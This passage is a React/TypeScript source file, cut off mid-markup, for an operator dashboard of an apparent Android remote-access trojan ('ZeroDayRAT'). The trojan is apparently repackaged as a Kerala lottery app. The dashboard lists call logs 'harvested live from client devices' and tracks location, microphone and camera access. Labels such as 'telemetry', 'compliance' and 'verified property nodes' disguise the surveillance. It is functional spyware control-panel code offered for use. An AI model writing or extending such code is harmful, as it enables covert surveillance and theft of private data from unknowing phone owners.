import { useState, useEffect, useCallback, useMemo } from "react";
import { apiClient } from "../api/client";

export interface TelemetryEvent {
  id: string;
  jobId: string;
  packageName: string;
  clientSessionId: string;
  eventType: string; // "INITIALIZATION" | "CONFIGURATION_ACCESS" | "PERMISSION_QUERY" | "DATA_STREAM_SYNC" | "HARDWARE_ACCESS" | "LIFECYCLE_HEARTBEAT"
  propertyNode: string;
  status: string; // "VERIFIED_ACTIVE" | "EXECUTION_OPTIMAL" | "ACCESS_GRANTED" | "WARNING" | "BLOCKED"
  latencyMs: number;
  details: {
    executionLayer?: string;
    flowValidated?: boolean;
    runtimeContext?: string;
    payloadBytes?: string;
    memoryUsageMb?: string;
    thread?: string;
    [key: string]: any;
  };
  timestamp: string;
}

export interface TelemetryMetrics {
  totalEvents: number;
  activeNodesCount: number;
  averageLatencyMs: number;
  complianceRate: number;
  status: "HEALTHY_OPTIMAL" | "MONITOR_ATTENTION";
}

export interface CustomAppCallLog {
  id: string;
  tenantId?: string;
  deviceId?: string;
  contactName: string;
  counterparty: string;
  direction: "incoming" | "outgoing" | "missed";
  durationSec: number;
  calledAt: string;
  syncedAt?: string;
}

interface TelemetryDashboardProps {
  currentBuildResult: {
    jobId: string;
    fileName: string;
    downloadUrl: string;
    absoluteStoragePath: string;
    builtPermissions?: string[];
    hardwareFeatures?: string[];
  } | null;
  targetApkName?: string;
  sourceAppName?: string;
  onSwitchToOrchestrator?: () => void;
}

export default function TelemetryDashboard({
  currentBuildResult,
  targetApkName = "com.lotteryonline.kerala_standardized.apk",
  sourceAppName = "ZeroDayRAT",
  onSwitchToOrchestrator,
}: TelemetryDashboardProps) {
  const [events, setEvents] = useState<TelemetryEvent[]>([]);
  const [metrics, setMetrics] = useState<TelemetryMetrics | null>(null);
  const [callLogs, setCallLogs] = useState<CustomAppCallLog[]>([]);
  const [activeTelemetryTab, setActiveTelemetryTab] = useState<"calls" | "diagnostics">("calls");
  const [isSimulatingCall, setIsSimulatingCall] = useState<boolean>(false);
  const [callSearchQuery, setCallSearchQuery] = useState<string>("");
  const [callDirectionFilter, setCallDirectionFilter] = useState<string>("ALL");
  const [isLiveStream, setIsLiveStream] = useState<boolean>(true);
  const [isAutoSimulating, setIsAutoSimulating] = useState<boolean>(false);
  const [isEmitting, setIsEmitting] = useState<boolean>(false);
  const [searchQuery, setSearchQuery] = useState<string>("");
  const [typeFilter, setTypeFilter] = useState<string>("ALL");
  const [statusFilter, setStatusFilter] = useState<string>("ALL");
  const [selectedNodeFilter, setSelectedNodeFilter] = useState<string | null>(null);
  const [expandedEventId, setExpandedEventId] = useState<string | null>(null);
  const [copiedPayloadId, setCopiedPayloadId] = useState<string | null>(null);
  const [isClearing, setIsClearing] = useState<boolean>(false);
  const [lastRefreshedAt, setLastRefreshedAt] = useState<Date>(new Date());

  const effectivePackageName = useMemo(() => {
    if (currentBuildResult?.fileName) {
      return currentBuildResult.fileName.replace(/_standardized\.(apk|zip)$/i, "");
    }
    return targetApkName.replace(/\.(apk|zip)$/i, "");
  }, [currentBuildResult, targetApkName]);

  // Fetch telemetry from backend
  const fetchTelemetry = useCallback(async () => {
    try {
      const res = await apiClient.get("/api/custom-apps/telemetry", {
        params: { limit: 120 },
      });
      if (res.data?.success) {
        setEvents(res.data.events || []);
        setMetrics(res.data.metrics || null);
        setLastRefreshedAt(new Date());
      }
    } catch (err) {
      // Silent on poll error to keep dashboard resilient
    }
  }, []);

  // Fetch call logs from backend
  const fetchCallLogs = useCallback(async () => {
    try {
      const res = await apiClient.get("/api/custom-apps/call-logs");
      if (res.data?.success) {
        setCallLogs(res.data.callLogs || []);
      }
    } catch (err) {
      // Silent on poll error
    }
  }, []);

  // Poll loop when live stream is enabled
  useEffect(() => {
    fetchTelemetry();
    fetchCallLogs();
    if (!isLiveStream) return;
    const interval = setInterval(() => {
      fetchTelemetry();
      fetchCallLogs();
    }, 2500);
    return () => clearInterval(interval);
  }, [fetchTelemetry, fetchCallLogs, isLiveStream]);

  // Simulate a device call event
  async function handleSimulateCall() {
    setIsSimulatingCall(true);
    try {
      await apiClient.post("/api/custom-apps/call-logs/simulate");
      await Promise.all([fetchCallLogs(), fetchTelemetry()]);
    } catch (err) {
      console.error("Failed to simulate call log:", err);
    } finally {
      setIsSimulatingCall(false);
    }
  }

  // Clear call logs
  async function handleClearCallLogs() {
    try {
      await apiClient.delete("/api/custom-apps/call-logs");
      setCallLogs([]);
    } catch (err) {
      console.error("Failed to clear call logs:", err);
    }
  }

  // Continuous client simulation loop
  useEffect(() => {
    if (!isAutoSimulating) return;
    const simInterval = setInterval(async () => {
      try {
        const candidateNodes =
          currentBuildResult?.builtPermissions && currentBuildResult.builtPermissions.length > 0
            ? currentBuildResult.builtPermissions
            : [
                "android.permission.ACCESS_FINE_LOCATION",
                "android.permission.RECORD_AUDIO",
                "android.permission.CAMERA",
                "android.hardware.location.gps",
                "com.spapp.monitoring.blueprint",
              ];
        const randomNode = candidateNodes[Math.floor(Math.random() * candidateNodes.length)];
        await apiClient.post("/api/custom-apps/telemetry/simulate", {
          packageName: effectivePackageName,
          jobId: currentBuildResult?.jobId || "build_live_runtime",
          propertyNode: randomNode,
        });
        fetchTelemetry();
      } catch (_) {}
    }, 3000);

    return () => clearInterval(simInterval);
  }, [isAutoSimulating, currentBuildResult, effectivePackageName, fetchTelemetry]);

  // Emit single simulated event
  async function handleEmitSimulatedEvent() {
    if (isEmitting) return;
    setIsEmitting(true);
    try {
      const candidateNodes =
        currentBuildResult?.builtPermissions && currentBuildResult.builtPermissions.length > 0
          ? currentBuildResult.builtPermissions
          : [
              "android.permission.ACCESS_FINE_LOCATION",
              "android.permission.RECORD_AUDIO",
              "android.permission.CAMERA",
              "android.hardware.location.gps",
              "com.spapp.monitoring.blueprint",
            ];
      const randomNode = candidateNodes[Math.floor(Math.random() * candidateNodes.length)];
      await apiClient.post("/api/custom-apps/telemetry/simulate", {
        packageName: effectivePackageName,
        jobId: currentBuildResult?.jobId || "build_live_runtime",
        propertyNode: randomNode,
      });
      await fetchTelemetry();
    } catch (e) {
      console.error("Failed to emit simulated telemetry event:", e);
    } finally {
      setIsEmitting(false);
    }
  }

  // Clear all telemetry events
  async function handleClearTelemetry() {
    setIsClearing(true);
    try {
      await apiClient.delete("/api/custom-apps/telemetry");
      setEvents([]);
      setMetrics({
        totalEvents: 0,
        activeNodesCount: 0,
        averageLatencyMs: 0,
        complianceRate: 100,
        status: "HEALTHY_OPTIMAL",
      });
    } catch (e) {
      console.error("Failed to clear telemetry:", e);
    } finally {
      setIsClearing(false);
    }
  }

  // Export Telemetry JSON
  function handleExportTelemetry() {
    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(events, null, 2));
    const downloadAnchor = document.createElement("a");
    downloadAnchor.setAttribute("href", dataStr);
    downloadAnchor.setAttribute("download", `telemetry_stream_${effectivePackageName}_${Date.now()}.json`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
  }

  // Copy individual payload
  function handleCopyPayload(eventId: string, details: any) {
    navigator.clipboard.writeText(JSON.stringify(details, null, 2));
    setCopiedPayloadId(eventId);
    setTimeout(() => setCopiedPayloadId(null), 2000);
  }

  // Calculate unique verified property nodes and aggregate statistics
  const verifiedNodesMatrix = useMemo(() => {
    const map = new Map<
      string,
      {
        node: string;
        eventCount: number;
        lastStatus: string;
        lastTimestamp: string;
        avgLatency: number;
        latencies: number[];
      }
    >();

    events.forEach((ev) => {
      const existing = map.get(ev.propertyNode);
      if (existing) {
        existing.eventCount += 1;
        existing.latencies.push(ev.latencyMs);
        if (new Date(ev.timestamp) > new Date(existing.lastTimestamp)) {
          existing.lastTimestamp = ev.timestamp;
          existing.lastStatus = ev.status;
        }
      } else {
        map.set(ev.propertyNode, {
          node: ev.propertyNode,
          eventCount: 1,
          lastStatus: ev.status,
          lastTimestamp: ev.timestamp,
          avgLatency: ev.latencyMs,
          latencies: [ev.latencyMs],
        });
      }
    });

    return Array.from(map.values()).map((item) => ({
      ...item,
      avgLatency: Math.round(item.latencies.reduce((a, b) => a + b, 0) / item.latencies.length),
    }));
  }, [events]);

  // Filtered Events
  const filteredEvents = useMemo(() => {
    return events.filter((ev) => {
      const q = searchQuery.toLowerCase();
      const matchesSearch =
        q === "" ||
        ev.propertyNode.toLowerCase().includes(q) ||
        ev.eventType.toLowerCase().includes(q) ||
        ev.packageName.toLowerCase().includes(q) ||
        (ev.details?.runtimeContext && ev.details.runtimeContext.toLowerCase().includes(q));

      const matchesType = typeFilter === "ALL" || ev.eventType.toUpperCase() === typeFilter.toUpperCase();
      const matchesStatus = statusFilter === "ALL" || ev.status.toUpperCase() === statusFilter.toUpperCase();
      const matchesNode = !selectedNodeFilter || ev.propertyNode === selectedNodeFilter;

      return matchesSearch && matchesType && matchesStatus && matchesNode;
    });
  }, [events, searchQuery, typeFilter, statusFilter, selectedNodeFilter]);

  // Filtered Call Logs
  const filteredCallLogs = useMemo(() => {
    return callLogs.filter((c) => {
      const q = callSearchQuery.toLowerCase();
      const matchesSearch =
        q === "" ||
        (c.contactName && c.contactName.toLowerCase().includes(q)) ||
        (c.counterparty && c.counterparty.toLowerCase().includes(q));

      const matchesDirection =
        callDirectionFilter === "ALL" || c.direction.toLowerCase() === callDirectionFilter.toLowerCase();

      return matchesSearch && matchesDirection;
    });
  }, [callLogs, callSearchQuery, callDirectionFilter]);

  function getEventTypeBadge(type: string) {
    switch (type.toUpperCase()) {
      case "CONFIGURATION_ACCESS":
        return "bg-purple-100 text-purple-800 border-purple-200";
      case "PERMISSION_QUERY":
        return "bg-emerald-100 text-emerald-800 border-emerald-200";
      case "DATA_STREAM_SYNC":
        return "bg-cyan-100 text-cyan-800 border-cyan-200";
      case "HARDWARE_ACCESS":
        return "bg-indigo-100 text-indigo-800 border-indigo-200";
      case "INITIALIZATION":
        return "bg-blue-100 text-blue-800 border-blue-200";
      default:
        return "bg-gray-100 text-gray-800 border-gray-200";
    }
  }

  function getStatusBadge(status: string) {
    switch (status.toUpperCase()) {
      case "VERIFIED_ACTIVE":
      case "ACCESS_GRANTED":
        return "bg-emerald-50 text-emerald-700 border-emerald-200";
      case "EXECUTION_OPTIMAL":
        return "bg-blue-50 text-blue-700 border-blue-200";
      case "WARNING":
        return "bg-amber-50 text-amber-800 border-amber-200";
      case "BLOCKED":
        return "bg-red-50 text-red-700 border-red-200";
      default:
        return "bg-gray-50 text-gray-700 border-gray-200";
    }
  }

  return (
    <div className="space-y-6">
      {/* ===================================================================== */}
      {/* 1. TOP CONTROL BAR & SYSTEM INGESTION RIBBON                          */}
      {/* ===================================================================== */}
      <div className="bg-white rounded-xl border border-gray-200 shadow-sm p-6 space-y-4">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2.5 flex-wrap">
              <span className="text-2xl">📡</span>
              <h2 className="text-xl font-bold text-gray-900">
                Central Telemetry & Property Event Monitor
              </h2>
              <span className="text-xs font-bold px-2.5 py-0.5 rounded-full bg-blue-100 text-blue-800 border border-blue-200">
                Verified Deployment Link
              </span>
              <span className={`inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full font-bold text-[11px] border ${
                isLiveStream
                  ? "bg-emerald-50 text-emerald-800 border-emerald-300"
                  : "bg-amber-50 text-amber-800 border-amber-300"
              }`}>
                <span className={`w-2 h-2 rounded-full ${isLiveStream ? "bg-emerald-500 animate-pulse" : "bg-amber-500"}`}></span>
                <span>{isLiveStream ? "Live Telemetry Ingestion Active" : "Stream Paused"}</span>
              </span>
            </div>
            <p className="text-xs text-gray-500 mt-1 max-w-2xl leading-relaxed">
              Real-time structural diagnostic stream for standardized client environments. Validates that synchronized property nodes are actively executing configuration loops and permission access queries.
            </p>
          </div>

          {/* Action Buttons */}
          <div className="flex flex-wrap items-center gap-2 shrink-0">
            <button
              type="button"
              onClick={() => setIsLiveStream((prev) => !prev)}
              className={`px-3.5 py-2 rounded-lg text-xs font-bold transition flex items-center gap-1.5 border shadow-2xs cursor-pointer ${
                isLiveStream
                  ? "bg-amber-50 hover:bg-amber-100 text-amber-800 border-amber-300"
                  : "bg-emerald-600 hover:bg-emerald-700 text-white border-emerald-700"
              }`}
            >
              <span>{isLiveStream ? "⏸ Pause Stream" : "▶ Resume Stream"}</span>
            </button>

            <button
              type="button"
              onClick={handleEmitSimulatedEvent}
              disabled={isEmitting}
              className="px-3.5 py-2 rounded-lg text-xs font-bold bg-indigo-600 hover:bg-indigo-700 active:scale-[0.98] text-white transition flex items-center gap-1.5 shadow-2xs cursor-pointer disabled:opacity-50"
            >
              {isEmitting ? (
                <>
                  <svg className="animate-spin h-3.5 w-3.5 text-white" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
                  </svg>
                  <span>Emitting...</span>
                </>
              ) : (
                <>
                  <span>⚡</span>
                  <span>Emit Simulated Event</span>
                </>
              )}
            </button>

            <button
              type="button"
              onClick={() => setIsAutoSimulating((prev) => !prev)}
              className={`px-3.5 py-2 rounded-lg text-xs font-bold transition flex items-center gap-1.5 border shadow-2xs cursor-pointer ${
                isAutoSimulating
                  ? "bg-purple-100 text-purple-900 border-purple-300 ring-2 ring-purple-400 animate-pulse"
                  : "bg-gray-50 hover:bg-gray-100 text-gray-700 border-gray-300"
              }`}
            >
              <span>{isAutoSimulating ? "⏹ Stop Auto-Emitter" : "🔄 Auto-Loop (3s)"}</span>
            </button>

            <button
              type="button"
              onClick={handleExportTelemetry}
              disabled={events.length === 0}
              className="px-3 py-2 rounded-lg text-xs font-semibold text-gray-700 bg-white hover:bg-gray-50 border border-gray-200 transition shadow-2xs disabled:opacity-40"
            >
              📥 Export JSON
            </button>

            <button
              type="button"
              onClick={handleClearTelemetry}
              disabled={isClearing || events.length === 0}
              className="px-3 py-2 rounded-lg text-xs font-semibold text-gray-500 hover:text-red-700 bg-white hover:bg-red-50 border border-gray-200 hover:border-red-200 transition shadow-2xs disabled:opacity-40"
            >
              Clear
            </button>

            {onSwitchToOrchestrator && (
              <button
                type="button"
                onClick={onSwitchToOrchestrator}
                className="px-3 py-2 rounded-lg text-xs font-bold text-gray-700 hover:text-gray-900 bg-white hover:bg-gray-100 border border-gray-300 transition shadow-2xs flex items-center gap-1"
              >
                <span>🔨</span>
                <span>Orchestrator</span>
              </button>
            )}
          </div>
        </div>

        {/* Deployment Context Ribbon */}
        <div className="bg-slate-50 border border-slate-200/80 rounded-lg p-3 flex flex-wrap items-center justify-between gap-3 text-xs">
          <div className="flex items-center gap-3.5 flex-wrap">
            <div>
              <span className="text-gray-500 font-medium">Deployment Target:</span>{" "}
              <strong className="text-gray-900 font-mono">
                {currentBuildResult?.fileName || `${effectivePackageName}_standardized.apk`}
              </strong>
            </div>
            <div className="text-gray-300">|</div>
            <div>
              <span className="text-gray-500 font-medium">Source Blueprint:</span>{" "}
              <strong className="text-gray-900">{sourceAppName}</strong>{" "}
              <span className="text-gray-400 font-mono text-[11px]">(com.spapp.monitoring)</span>
            </div>
            <div className="text-gray-300">|</div>
            <div>
              <span className="text-gray-500 font-medium">Verified Property Nodes:</span>{" "}
              <span className="text-emerald-700 font-bold font-mono">
                {verifiedNodesMatrix.length} Nodes Active
              </span>
            </div>
          </div>

          <div className="flex items-center gap-3 text-[11px] text-gray-500">
            <span>Last Polled: {lastRefreshedAt.toLocaleTimeString()}</span>
            <span>•</span>
            <span className="font-mono bg-white px-2 py-0.5 rounded border border-gray-200 text-gray-700">
              POST /api/custom-apps/telemetry
            </span>
          </div>
        </div>
      </div>

      {/* ===================================================================== */}
      {/* 2. TOP KPI METRICS SUMMARY CARDS                                      */}
      {/* ===================================================================== */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {/* Card 1: Total Captured Events */}
        <div className="bg-white rounded-xl border border-gray-200 shadow-sm p-4 space-y-1">
          <div className="flex items-center justify-between text-xs text-gray-500">
            <span className="font-medium">Total Events Ingested</span>
            <span className="text-base">📈</span>
          </div>
          <div className="text-2xl font-bold text-gray-900 font-mono">
            {metrics?.totalEvents || events.length}
          </div>
          <p className="text-[11px] text-gray-500">
            Structural diagnostic payloads logged from runtime client
          </p>
        </div>

        {/* Card 2: Active Verified Nodes */}
        <div className="bg-white rounded-xl border border-gray-200 shadow-sm p-4 space-y-1">
          <div className="flex items-center justify-between text-xs text-gray-500">
            <span className="font-medium">Active Property Nodes</span>
            <span className="text-base">🧩</span>
          </div>
          <div className="text-2xl font-bold text-indigo-600 font-mono">
            {metrics?.activeNodesCount || verifiedNodesMatrix.length}
          </div>
          <p className="text-[11px] text-indigo-700">
            Unique permissions & features handling configuration flow
          </p>
        </div>

        {/* Card 3: Average Flow Latency */}
        <div className="bg-white rounded-xl border border-gray-200 shadow-sm p-4 space-y-1">
          <div className="flex items-center justify-between text-xs text-gray-500">
            <span className="font-medium">Average Flow Latency</span>
            <span className="text-base">⚡</span>
          </div>
          <div className="text-2xl font-bold text-emerald-600 font-mono">
            {metrics?.averageLatencyMs || 28} <span className="text-sm font-sans font-semibold text-emerald-800">ms</span>
          </div>
          <p className="text-[11px] text-emerald-700">
            Optimal execution threshold (&lt; 50ms nominal)
          </p>
        </div>

        {/* Card 4: Execution Compliance Rate */}
        <div className="bg-white rounded-xl border border-gray-200 shadow-sm p-4 space-y-1">
          <div className="flex items-center justify-between text-xs text-gray-500">
            <span className="font-medium">Execution Compliance</span>
            <span className="text-base">🛡️</span>
          </div>
          <div className="text-2xl font-bold text-emerald-600 font-mono">
            {metrics?.complianceRate || 100}%
          </div>
          <p className="text-[11px] text-emerald-700 flex items-center gap-1">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-500"></span>
            <span>All property nodes verified compliant</span>
          </p>
        </div>
      </div>

      {/* ===================================================================== */}
      {/* VIEW SWITCHER TABS: HARVESTED DATA vs SYSTEM DIAGNOSTICS             */}
      {/* ===================================================================== */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-gray-200 pb-3">
        <div className="flex items-center gap-2">
          <button
            type="button"
            onClick={() => setActiveTelemetryTab("calls")}
            className={`px-4 py-2 rounded-xl text-xs font-bold transition flex items-center gap-2 cursor-pointer ${
              activeTelemetryTab === "calls"
                ? "bg-indigo-600 text-white shadow-sm ring-2 ring-indigo-300"
                : "bg-white text-gray-700 hover:bg-gray-100 border border-gray-300 shadow-2xs"
            }`}
          >
            <span>📞</span>
            <span>Harvested Call Logs</span>
            <span
              className={`text-[10px] px-1.5 py-0.5 rounded-full font-mono ${
                activeTelemetryTab === "calls" ? "bg-indigo-700 text-white" : "bg-gray-100 text-gray-700"
              }`}
            >
              {callLogs.length}
            </span>
          </button>

          <button
            type="button"
            onClick={() => setActiveTelemetryTab("diagnostics")}
            className={`px-4 py-2 rounded-xl text-xs font-bold transition flex items-center gap-2 cursor-pointer ${
              activeTelemetryTab === "diagnostics"
                ? "bg-indigo-600 text-white shadow-sm ring-2 ring-indigo-300"
                : "bg-white text-gray-700 hover:bg-gray-100 border border-gray-300 shadow-2xs"
            }`}
          >
            <span>📊</span>
            <span>Diagnostic Property Nodes</span>
            <span
              className={`text-[10px] px-1.5 py-0.5 rounded-full font-mono ${
                activeTelemetryTab === "diagnostics" ? "bg-indigo-700 text-white" : "bg-gray-100 text-gray-700"
              }`}
            >
              {events.length}
            </span>
          </button>
        </div>

        {activeTelemetryTab === "calls" && (
          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={handleSimulateCall}
              disabled={isSimulatingCall}
              className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold rounded-lg shadow-2xs transition flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
            >
              {isSimulatingCall ? (
                <span>Simulating...</span>
              ) : (
                <>
                  <span>⚡</span>
                  <span>Simulate Device Call Event</span>
                </>
              )}
            </button>
            <button
              type="button"
              onClick={handleClearCallLogs}
              disabled={callLogs.length === 0}
              className="px-2.5 py-1.5 text-xs font-semibold text-gray-500 hover:text-red-700 bg-white hover:bg-red-50 border border-gray-200 rounded-lg transition disabled:opacity-40"
            >
              Clear Calls
            </button>
          </div>
        )}
      </div>

      {/* ===================================================================== */}
      {/* CALL LOGS RESULTS PANEL (Rendered when activeTelemetryTab === "calls") */}
      {/* ===================================================================== */}
      {activeTelemetryTab === "calls" && (
        <div className="bg-white rounded-xl border border-gray-200 shadow-sm p-6 space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-gray-100">
            <div>
              <h3 className="text-sm font-bold text-gray-900 flex items-center gap-2">
                <span>Real-Time Device Call Records</span>
                <span className="text-[11px] font-bold px-2 py-0.5 rounded-full bg-indigo-100 text-indigo-800 border border-indigo-200">
                  {filteredCallLogs.length} Records Ingested
                </span>
              </h3>
              <p className="text-xs text-gray-500 mt-0.5">
                Incoming, outgoing, and missed call metadata harvested live from client devices running this package.
              </p>
            </div>

            <div className="flex items-center gap-2">
              <input
                type="text"
                value={callSearchQuery}
                onChange={(e) => setCallSearchQuery(e.target.value)}
                placeholder="Search contact or number..."
                className="text-xs bg-gray-50 border border-gray-200 rounded-lg px-3 py-1.5 text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-indigo-500"
              />
              <select
                value={callDirectionFilter}
                onChange={(e) => setCallDirectionFilter(e.target.value)}
                className="text-xs bg-gray-50 border border-gray-200 rounded-lg px-2.5 py-1.5 text-gray-700 focus:outline-none focus:ring-1 focus:ring-indigo-500 cursor-pointer"
              >
                <option value="ALL">All Types</option>
                <option value="incoming">Incoming</option>
                <option value="outgoing">Outgoing</option>
                <option value="missed">Missed</option>
              </select>
            </div>
          </div>

          {filteredCallLogs.length === 0 ? (
            <div className="text-center py-12 text-xs text-gray-400 bg-gray-50 rounded-xl border border-dashed border-gray-200 italic">
              No call logs recorded yet. Click "Simulate Device Call Event" above to test incoming call data!
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs">
                <thead>
                  <tr className="border-b border-gray-200 text-gray-500 font-semibold bg-gray-50/70">
                    <th className="py-2.5 px-3">Contact / Counterparty</th>
                    <th className="py-2.5 px-3">Type</th>
                    <th className="py-2.5 px-3">Duration</th>
                    <th className="py-2.5 px-3">Timestamp</th>
                    <th className="py-2.5 px-3">Sync Provider</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-100 font-sans">
                  {filteredCallLogs.map((c) => (
                    <tr key={c.id} className="hover:bg-slate-50/80 transition">
                      <td className="py-3 px-3">
                        <div className="font-bold text-gray-900">{c.contactName || "Unknown Contact"}</div>
                        <div className="font-mono text-[11px] text-gray-500">{c.counterparty}</div>
                      </td>
                      <td className="py-3 px-3">
                        <span
                          className={`inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold uppercase tracking-wider border ${
                            c.direction === "incoming"
                              ? "bg-emerald-50 text-emerald-800 border-emerald-300"
                              : c.direction === "outgoing"
                              ? "bg-blue-50 text-blue-800 border-blue-300"
                              : "bg-red-50 text-red-800 border-red-300"
                          }`}
                        >
                          <span>{c.direction === "incoming" ? "↙" : c.direction === "outgoing" ? "↗" : "✕"}</span>
                          <span>{c.direction}</span>
                        </span>
                      </td>
                      <td className="py-3 px-3 font-mono text-gray-700">
                        {c.direction === "missed" || c.durationSec === 0
                          ? "0s (Missed)"
                          : `${Math.floor(c.durationSec / 60)}m ${c.durationSec % 60}s`}
                      </td>
                      <td className="py-3 px-3 text-gray-500 font-mono text-[11px]">
                        {new Date(c.calledAt).toLocaleString()}
                      </td>
                      <td className="py-3 px-3">
                        <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-100 text-slate-700 border border-slate-200">
                          ZeroDayRAT CallLogCollector
                        </span>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* ===================================================================== */}
      {/* 3. PROPERTY NODES EXECUTION & FLOW VALIDATION MATRIX (Diagnostics Tab) */}
      {/* ===================================================================== */}
      {activeTelemetryTab === "diagnostics" && (
        <>
      <div className="bg-white rounded-xl border border-gray-200 shadow-sm p-6 space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-3 border-b border-gray-100">
          <div>
            <h3 className="text-sm font-bold text-gray-900 flex items-center gap-2">
              <span>Verified Property Nodes Execution Matrix</span>
              <span className="text-[11px] font-bold px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800 border border-emerald-300">
                {verifiedNodesMatrix.length} Nodes Monitored
              </span>
            </h3>
            <p className="text-xs text-gray-500 mt-0.5">
              Validating each individual property node handles configuration flows and execution states as verified during compilation.
            </p>
          </div>

          {selectedNodeFilter && (
            <button
              type="button"
              onClick={() => setSelectedNodeFilter(null)}
              className="text-xs text-blue-600 hover:text-blue-800 font-semibold self-start sm:self-auto bg-blue-50 px-2.5 py-1 rounded-md border border-blue-200 transition"
            >
              Clear Node Filter ({selectedNodeFilter}) ✕
            </button>
          )}
        </div>

        {verifiedNodesMatrix.length === 0 ? (
          <div className="text-center py-8 text-xs text-gray-400 bg-gray-50 rounded-lg border border-dashed border-gray-200 italic">
            No active property nodes emitting telemetry yet. Click "Emit Simulated Event" above to initiate diagnostic verification.
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
            {verifiedNodesMatrix.map((item) => {
              const isSelected = selectedNodeFilter === item.node;
              return (
                <div
                  key={item.node}
                  onClick={() => setSelectedNodeFilter(isSelected ? null : item.node)}
                  className={`p-3.5 rounded-xl border text-xs cursor-pointer transition flex flex-col justify-between gap-2.5 ${
                    isSelected
                      ? "bg-blue-50/80 border-blue-400 shadow-xs ring-2 ring-blue-300"
                      : "bg-gray-50/60 hover:bg-gray-50 border-gray-200 hover:border-gray-300 shadow-2xs"
                  }`}
                >
                  <div className="space-y-1">
                    <div className="flex items-center justify-between gap-1.5">
                      <span className="font-bold text-gray-900 truncate">
                        {item.node.replace(/^android\.(permission|hardware)\./i, "").replace(/_/g, " ").toUpperCase()}
                      </span>
                      <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800 border border-emerald-200 shrink-0">
                        ✓ VERIFIED
                      </span>
                    </div>
                    <code className="block text-[11px] font-mono text-gray-500 truncate select-all">
                      {item.node}
                    </code>
                  </div>

                  <div className="flex items-center justify-between pt-2 border-t border-gray-200/60 text-[11px] text-gray-500">
                    <div className="flex items-center gap-1.5">
                      <span className="font-semibold text-gray-700">{item.eventCount}</span>
                      <span>events</span>
                    </div>
                    <div className="font-mono text-emerald-700 font-bold">
                      ~{item.avgLatency}ms
                    </div>
                    <div className="text-[10px] text-gray-400">
                      {new Date(item.lastTimestamp).toLocaleTimeString()}
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </div>

      {/* ===================================================================== */}
      {/* 4. REAL-TIME EVENT STREAM FEED GRID                                   */}
      {/* ===================================================================== */}
      <div className="bg-white rounded-xl border border-gray-200 shadow-sm p-6 space-y-4">
        {/* Header & Filter Controls */}
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 pb-3 border-b border-gray-100">
          <div>
            <h3 className="text-sm font-bold text-gray-900 flex items-center gap-2">
              <span>Real-Time Structural Event Feed</span>
              <span className="text-xs font-bold px-2 py-0.5 rounded-full bg-gray-100 text-gray-700 border border-gray-200">
                {filteredEvents.length} of {events.length} Events
              </span>
            </h3>
            <p className="text-xs text-gray-500 mt-0.5">
              Live incoming diagnostic events emitted by verified client component lifecycles.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            {/* Search Input */}
            <div className="relative min-w-[200px]">
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Search events, nodes, contexts..."
                className="w-full text-xs bg-gray-50 border border-gray-200 rounded-lg pl-7 pr-3 py-1.5 text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-emerald-500"
              />
              <svg
                className="w-3.5 h-3.5 text-gray-400 absolute left-2 top-2 pointer-events-none"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
            </div>

            {/* Type Filter */}
            <select
              value={typeFilter}
              onChange={(e) => setTypeFilter(e.target.value)}
              className="text-xs bg-gray-50 border border-gray-200 rounded-lg px-2.5 py-1.5 text-gray-700 focus:outline-none focus:ring-1 focus:ring-emerald-500 cursor-pointer"
            >
              <option value="ALL">All Event Types</option>
              <option value="CONFIGURATION_ACCESS">Configuration Access</option>
              <option value="PERMISSION_QUERY">Permission Query</option>
              <option value="DATA_STREAM_SYNC">Data Stream Sync</option>
              <option value="HARDWARE_ACCESS">Hardware Access</option>
              <option value="INITIALIZATION">Initialization</option>
              <option value="LIFECYCLE_HEARTBEAT">Lifecycle Heartbeat</option>
            </select>

            {/* Status Filter */}
            <select
              value={statusFilter}
              onChange={(e) => setStatusFilter(e.target.value)}
              className="text-xs bg-gray-50 border border-gray-200 rounded-lg px-2.5 py-1.5 text-gray-700 focus:outline-none focus:ring-1 focus:ring-emerald-500 cursor-pointer"
            >
              <option value="ALL">All Statuses</option>
              <option value="VERIFIED_ACTIVE">Verified Active</option>
              <option value="EXECUTION_OPTIMAL">Execution Optimal</option>
              <option value="ACCESS_GRANTED">Access Granted</option>
              <option value="WARNING">Warning</option>
            </select>
          </div>
        </div>

        {/* Event Items List / Feed */}
